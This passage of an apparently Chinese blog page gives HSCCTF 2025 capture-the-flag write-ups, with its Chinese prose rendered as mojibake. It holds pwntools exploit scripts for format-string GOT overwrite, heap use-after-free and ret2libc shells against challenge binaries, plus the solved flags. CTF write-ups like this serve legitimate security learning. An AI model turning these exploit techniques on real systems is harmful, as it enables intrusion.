class="headerlink" title="PWN3"></a>PWN3</h3><p>æ ¼å¼åŒ–å­—ç¬¦ä¸²ï¼Œæµ‹è¯•åç§»æ˜¯8ï¼Œè®¡ç®—æŒ‡é’ˆptrå¯¹åº”çš„ä½ç½®ï¼š</p><p>8+(0x70-8)//8=21</p><p>è¾“å…¥ <code>%21$s</code>ï¼Œè¯»å‡ºæŒ‡é’ˆptræŒ‡å‘çš„åœ°å€å†…å®¹å¾—flagã€‚</p><p>â€‹</p><h3 id="PWN4"><a href="#PWN4" class="headerlink" title="PWN4"></a>PWN4</h3><p>ç”¨æ ¼å¼åŒ–å­—ç¬¦ä¸²æ³„éœ²ç¨‹åºåŸºå€ï¼Œç„¶åä¿®æ”¹printf_gotä¸ºsystem_pltï¼Œæœ€ågetshellã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"></span><br><span class="line">r = remote(<span class="string">&#x27;150.138.81.18&#x27;</span>,<span class="number">13323</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># pie_base</span></span><br><span class="line">pl = <span class="string">b&#x27;%41$p&#x27;</span></span><br><span class="line">r.sendline(pl)</span><br><span class="line">pie_base = <span class="built_in">eval</span>(r.recvline())-<span class="number">74</span>-elf.sym.main</span><br><span class="line">success(<span class="string">f&#x27;<span class="subst">&#123;pie_base:x&#125;</span>&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># printf_got -&gt; system_plt</span></span><br><span class="line">printf_got = pie_base+elf.got.printf</span><br><span class="line">system_plt = pie_base+elf.plt.system</span><br><span class="line">pl = fmtstr_payload(<span class="number">6</span>,&#123;printf_got:system_plt&#125;)</span><br><span class="line"><span class="built_in">print</span>(pl)</span><br><span class="line">r.sendline(pl)</span><br><span class="line"></span><br><span class="line"><span class="comment"># read /bin/sh</span></span><br><span class="line">r.sendline(<span class="string">b&#x27;/bin/sh\x00&#x27;</span>)</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure><p>â€‹</p><h3 id="PWN6"><a href="#PWN6" class="headerlink" title="PWN6"></a>PWN6</h3><p>é¢˜ç›®ç»“æ„å’Œpwn2ä¸€æ ·ï¼Œå­˜åœ¨uafå’ŒæŒ‡é’ˆè°ƒç”¨ã€‚</p><p>å…ˆé‡Šæ”¾ä¸¤ä¸ªå †å—ï¼Œè¿›å…¥tcachebinsä¸­ï¼Œå†é‡æ–°ç”³è¯·0x18å¤§å°çš„å †å—ï¼ŒåŠ«æŒæ“ä½œå †å—ï¼Œå‘ç°è¿˜å­˜åœ¨æ‰“å°æŒ‡é’ˆï¼Œé€šè¿‡ä¿®æ”¹æ–°çš„å †å—æ„é€ ropé“¾ï¼Œä¹‹åå†é€šè¿‡uafæ¼æ´edit_noteåŠ«æŒç¬¬1ä¸ªå †å—ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"></span><br><span class="line">r = remote(<span class="string">&#x27;150.138.81.18&#x27;</span>,<span class="number">14551</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">cmd</span>(<span class="params">idx</span>):</span><br><span class="line">    r.sendlineafter(<span class="string">b&quot;Choice: &quot;</span>,<span class="built_in">str</span>(idx).encode())</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">size,msg</span>):</span><br><span class="line">    cmd(<span class="number">1</span>)</span><br><span class="line">    r.sendlineafter(<span class="string">b&#x27;Size: &#x27;</span>,<span class="built_in">str</span>(size).encode())</span><br><span class="line">    r.sendafter(<span class="string">b&#x27;Content: &#x27;</span>,msg)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">idx,msg</span>):</span><br><span class="line">    cmd(<span class="number">2</span>)</span><br><span class="line">    r.sendlineafter(<span class="string">b&#x27;Index: &#x27;</span>,<span class="built_in">str</span>(idx).encode())</span><br><span class="line">    r.sendafter(<span class="string">b&#x27;content: &#x27;</span>,msg)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">idx</span>):</span><br><span class="line">    cmd(<span class="number">3</span>)</span><br><span class="line">    r.sendlineafter(<span class="string">b&#x27;Index: &#x27;</span>,<span class="built_in">str</span>(idx).encode())</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">idx</span>):</span><br><span class="line">    cmd(<span class="number">4</span>)</span><br><span class="line">    r.sendlineafter(<span class="string">b&#x27;Index: &#x27;</span>,<span class="built_in">str</span>(idx).encode())</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x28</span>,<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line">add(<span class="number">0x28</span>,<span class="string">b&#x27;c&#x27;</span>)</span><br><span class="line">add(<span class="number">0x20</span>,<span class="string">b&#x27;b&#x27;</span>)</span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">add(<span class="number">0x18</span>,<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line">edit(<span class="number">3</span>,p64(<span class="number">0x402008</span>)*<span class="number">2</span>+p64(<span class="number">0x4010f0</span>))</span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure><p>â€‹</p><h3 id="PWN7"><a href="#PWN7" class="headerlink" title="PWN7"></a>PWN7</h3><p>ret2libcã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"></span><br><span class="line">r = remote(<span class="string">&#x27;150.138.81.18&#x27;</span>,<span class="number">14832</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./pwn7&#x27;</span>)</span><br><span class="line"></span><br><span class="line">puts_plt = elf.plt.puts</span><br><span class="line">puts_got = elf.got.puts</span><br><span class="line">pop_rdi = <span class="number">0x4016c1</span></span><br><span class="line">ret = <span class="number">0x40101a</span></span><br><span class="line">start = <span class="number">0x401110</span></span><br><span class="line">r.recvuntil(<span class="string">b&#x27;something: &#x27;</span>)</span><br><span class="line">pl = flat([<span class="string">b&#x27;a&#x27;</span>*(<span class="number">0xe</span>+<span class="number">8</span>),pop_rdi,puts_got,puts_plt,start])</span><br><span class="line">r.send(pl)</span><br><span class="line"></span><br><span class="line">r.recvline()</span><br><span class="line">puts_addr = u64(r.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">success(<span class="string">f&#x27;<span class="subst">&#123;puts_addr:x&#125;</span>&#x27;</span>)</span><br><span class="line"></span><br><span class="line">libc_base = puts_addr-<span class="number">0x080e50</span></span><br><span class="line">system = libc_base+<span class="number">0x050d70</span></span><br><span class="line">binsh = libc_base+<span class="number">0x1d8678</span></span><br><span class="line"></span><br><span class="line">r.recvuntil(<span class="string">b&#x27;something: &#x27;</span>)</span><br><span class="line">pl = flat([<span class="string">b&#x27;a&#x27;</span>*(<span class="number">0xe</span>+<span class="number">8</span>),ret,pop_rdi,binsh,system,start])</span><br><span class="line">r.send(pl)</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure><p>â€‹</p><h2 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h2><h3 id="Sign-in-1"><a href="#Sign-in-1" class="headerlink" title="Sign_in"></a>Sign_in</h3><blockquote><p>Follow the WeChat public account â€˜ä¸­é¾™æŠ€æœ¯â€™ and send â€˜HSCCTF2025â€™ and â€˜å®‰å…¨ KERâ€™ community to get the flag<br><a target="_blank" rel="noopener" href="https://shequ.anquanke.com/community/article-detail?uuid=4457ec2e-80f4-48de-81af-b22fd94d52ed">å®‰å…¨KER</a></p></blockquote><p>å…¬ä¼—å·å‘å…³é”®è¯ï¼Œå¾—å‰åŠæ®µï¼š<code>HSCCTF&#123;w3lc0me_hScC</code></p><p>è¿›å…¥ç½‘é¡µæ‰¾åˆ°å¸–å­ï¼Œå¾—ååŠæ®µï¼š<code>tf2oz5&#125;</code></p><p>flagï¼š</p><p><code>HSCCTF&#123;w3lc0me_hScCtf2oz5&#125;</code></p><p>â€‹</p><h3 id="Signin-WhoRwe"><a href="#Signin-WhoRwe" class="headerlink" title="Signin_WhoRwe"></a>Signin_WhoRwe</h3><p>jpgæœ«å°¾å­—ç¬¦ä¸²ï¼Œflagï¼š</p><p><code>HSCCTF&#123;Th1s_15_uS&#125;</code></p><p>â€‹</p><h3 id="Harris"><a href="#Harris" class="headerlink" title="Harris"></a>Harris</h3><p>æŠ•å·æ™®ä¸€ç¥¨ï¼Œç„¶åç­‰å€’è®¡æ—¶ç»“æŸå¾—flagã€‚</p><p>â€‹</p><h3 id="CALC"><a href="#CALC" class="headerlink" title="CALC"></a>CALC</h3><p>äº¤äº’é¢˜ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> tqdm <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">r = remote(<span class="string">&#x27;150.138.81.18&#x27;</span>,<span class="number">13875</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> trange(<span class="number">500</span>):</span><br><span class="line">    r.recvuntil(<span class="string">b&#x27;problem:\n&#x27;</span>)</span><br><span class="line">    exp=r.recvuntil(<span class="string">b&#x27;=&#x27;</span>)[:-<span class="number">1</span>]</span><br><span class="line">    r.recvline()</span><br><span class="line">    r.sendline(<span class="built_in">str</span>(<span class="built_in">eval</span>(exp)).encode())</span><br><span class="line">    r.recvline()</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure><p>â€‹</p><h3 id="Hidden-bullet-comments"><a href="#Hidden-bullet-comments" class="headerlink" title="Hidden bullet comments"></a>Hidden bullet comments</h3><blockquote><p><a href="www.pinkiefm.com">www.pinkiefm.com</a></p></blockquote><p>æ ¹æ®é¢˜ç›®æç¤ºâ€œéšè—çš„å¼¹å¹•â€ï¼Œæ³¨å†Œï¼Œæ‰“å¼€ç¬¬ä¸€é›†ï¼Œçœ‹å¼¹å¹•ã€‚</p><p>flagï¼š</p><p><code>HSCCTF&#123;I_Love_Stupidfish&#125;</code></p></div><div class="article-footer"></div></article><section id="comments"><div id="vcomments"></div></section></div><nav class="bar bar-footer clearfix" data-stick-bottom><div class="bar-inner"><ul class="pager pull-left"><li class="next"><a href="/2025/10/29/match-%E7%AC%AC%E5%8D%81%E5%85%AD%E5%B1%8A%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98/" title="ç¬¬åå…­å±Šæå®¢å¤§æŒ‘æˆ˜"><span>ä¸‹ä¸€ç¯‡&nbsp;&nbsp;</span><i class="icon icon-angle-right" aria-hidden="true"></i></a></li><li class="toggle-toc"><a class="toggle-btn collapsed" data-toggle="collapse" href="#collapseToc" aria-expanded="false" title="æ–‡ç« ç›®å½•" role="button"><span>[&nbsp;</span><span>æ–‡ç« ç›®å½•</span> <i class="text-collapsed icon icon-anchor"></i> <i class="text-in icon icon-close"></i> <span>]</span></a></li></ul><button type="button" class="btn btn-fancy btn-donate pop-onhover bg-gradient-warning" data-toggle="modal" data-target="#donateModal"><span>èµ</span></button><div class="bar-right"><div class="share-component" data-sites="weibo,qq,wechat" data-mobile-sites="weibo,qq,wechat"></div></div></div></nav><div class="modal modal-center modal-small modal-xs-full fade" id="donateModal" tabindex="-1" role="dialog"><div class="modal-dialog" role="document"><div class="modal-content donate"><button type="button" class="close" data-dismiss="modal" aria-label="Close"><span aria-hidden="true">&times;</span></button><div class="modal-body"><div class="donate-box"><div class="donate-head"><p>è¿™ç¯‡æ–‡ç« å¯¹ä½ æœ‰ç”¨ï¼Œèµä¸€æ¯å’–å•¡â˜•~~</p></div><div class="tab-content"><div role="tabpanel" class="tab-pane fade active in" id="wechatpay"><div class="donate-payimg"><img src="/images/donate/wechatpayimg.png" alt="æ‰«ç æ”¯æŒ" title="æ‰«ä¸€æ‰«"></div><p class="text-muted mv">âLazzaroâ </p><p class="text-grey">æ‰“å¼€å¾®ä¿¡æ‰«ä¸€æ‰«å³å¯æ‰«ç æ‰“èµä»–ä¸€æ³¢å“¦~</p></div><div role="tabpanel" class="tab-pane fade" id="alipay"><div class="donate-payimg"><img src="/images/donate/alipayimg.png" alt="æ‰«ç æ”¯æŒ" title="æ‰«ä¸€æ‰«"></div><p class="text-muted mv">âLazzaroâ </p><p class="text-grey">æ‰“å¼€æ”¯ä»˜å®æ‰«ä¸€æ‰«å³å¯æ‰«ç æ‰“èµä»–ä¸€æ³¢å“¦~</p></div></div><div class="donate-footer"><ul class="nav nav-tabs nav-justified" role="tablist"><li role="presentation" class="active"><a href="#wechatpay" role="tab" id="wechatpay-tab" data-toggle="tab" aria-controls="wechatpay" aria-expanded="true"><i class="icon icon-wepay"></i> å¾®ä¿¡æ”¯ä»˜</a></li><li role="presentation"><a href="#alipay" id="alipay-tab" role="tab" data-toggle="tab" aria-controls="alipay" aria-expanded="false"><i class="icon icon-alipay"></i> æ”¯ä»˜å®</a></li></ul></div></div></div></div></div></div></main><footer class="footer" itemscope itemtype="http://schema.org/WPFooter"><ul class="social-links"><li><a href="https://github.com/Lazzzaro" target="_blank" title="Github" data-toggle="tooltip" data-placement="top"><i class="icon icon-github"></i></a></li></ul><div class="copyright">&copy; 2025 Lazzaro<br><span>æ€»è®¿é—® - <span id="busuanzi_value_site_pv"></span>æ¬¡</span><br><span>è®¿å®¢æ•° - <span id="busuanzi_value_site_uv"></span>äºº</span><script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div></footer><script src="//cdn.jsdelivr.net/npm/jquery@1.12.4/dist/jquery.min.js"></script><script>window.jQuery||document.write('<script src="js/jquery.min.js"><\/script>')</script><script src="/js/plugin.min.js"></script><script src="/js/application.js"></script><script>window.INSIGHT_CONFIG={TRANSLATION:{POSTS:"æ–‡ç« ",PAGES:"é¡µé¢",CATEGORIES:"ç±»åˆ«",TAGS:"å…³é”®è¯",UNTITLED:"(æœªå‘½å)"},ROOT_URL:"/",CONTENT_URL:"/content.json"}</script><script src="/js/insight.js"></script><script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><script src="//cdn1.lncld.net/static/js/3.0.4/av-min.js"></script><script src="//cdn.jsdelivr.net/npm/valine"></script><script type="text/javascript">var GUEST=["nick","mail","link"],meta=(meta="nick,mail,link").split(",").filter(function(e){return-1<GUEST.indexOf(e)});new Valine({el:"#vcomments",verify:!1,notify:!1,appId:"sK4BUsDgfSB843HYgJyTcV7P-gzGzoHsz",appKey:"NKNx8m2CtFeDofr8LNLX7aNG",placeholder:"æ¥æ¥æ¥è¯´ç‚¹å•¥~~\r\nå¯¹ä½ æœ‰ç”¨ï¼Ÿèµä¸€æ³¢ï¼â†˜â†˜",avatar:"mp",meta:meta,pageSize:"10",visitor:!0})</script><script defer type="text/javascript">!function(e,a,t,n,g,c){e.GoogleAnalyticsObject=n,e.ga=e.ga||function(){(e.ga.q=e.ga.q||[]).push(arguments)},e.ga.l=+new Date,g=a.createElement(t),c=a.getElementsByTagName(t)[0],g.async=1,g.src="//www.google-analytics.com/analytics.js",c.parentNode.insertBefore(g,c)}(window,document,"script","ga"),ga("create","UA-165804489-1","auto"),ga("send","pageview")</script><style>.copy-btn{display:inline-block;padding:6px 12px;font-size:13px;font-weight:700;line-height:20px;color:#333;white-space:nowrap;vertical-align:middle;cursor:pointer;background-color:#eee;background-image:linear-gradient(#fcfcfc,#eee);border:1px solid #d5d5d5;border-radius:3px;user-select:none;outline:0}.highlight-wrap .copy-btn{transition:opacity .3s ease-in-out;opacity:0;padding:2px 6px;position:absolute;right:4px;top:8px;z-index:2}.highlight-wrap .copy-btn:focus,.highlight-wrap:hover .copy-btn{opacity:1}.highlight-wrap{position:relative}</style><script>addLoadEvent(()=>{$(".highlight").each(function(t,e){var n=$("<div>").addClass("highlight-wrap");$(e).after(n),n.append($("<button>").addClass("copy-btn").append("å¤åˆ¶").on("click",function(t){var e=$(this).parent().find(".code")[0].innerText;e+="\n/**\n* å¤åˆ¶å¹¶ä½¿ç”¨ä»£ç è¯·æ³¨æ˜å¼•ç”¨å‡ºå¤„å“¦~\n* Lazzaro @ https://lazzzaro.github.io\n*/";var n=document.createElement("textarea");document.body.appendChild(n),n.style.position="absolute",n.style.top="0px",n.style.left="0px",n.value=e,n.select(),n.focus();e=document.execCommand("copy");document.body.removeChild(n),e?$(this).text("å¤åˆ¶æˆåŠŸ"):$(this).text("å¤åˆ¶å¤±è´¥"),$(this).blur()})).on("mouseleave",function(t){var e=$(this).find(".copy-btn");setTimeout(function(){e.text("å¤åˆ¶")},300)}).append(e)})})</script><script type="text/x-mathjax-config">MathJax.Hub.Config({
        tex2jax: {
            inlineMath: [ ["$","$"], ["\\(","\\)"] ],
            skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code'],
            processEscapes: true
        }
    });
    MathJax.Hub.Queue(function() {
        var all = MathJax.Hub.getAllJax();
        for (var i = 0; i < all.length; ++i)
            all[i].SourceElement().parentNode.className += ' has-jax';
    });</script><script src="https://cdn.mathjax.org/mathjax/latest/MathJax.js?config=TeX-AMS-MML_HTMLorMML"></script></body></html>